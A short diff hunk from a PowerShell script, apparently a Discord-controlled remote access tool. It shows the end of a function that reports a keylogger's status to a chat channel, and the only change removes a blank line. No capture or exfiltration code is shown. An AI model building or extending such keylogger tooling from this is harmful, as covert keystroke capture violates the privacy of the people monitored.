@@ -235,4 +235,3 @@ function MGet_KeyloggerStatus {
         sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":gear: **Keylogger Status:** Stopped" -ChannelTarget $global:process_nekologger_channel_name
     }
 }
-
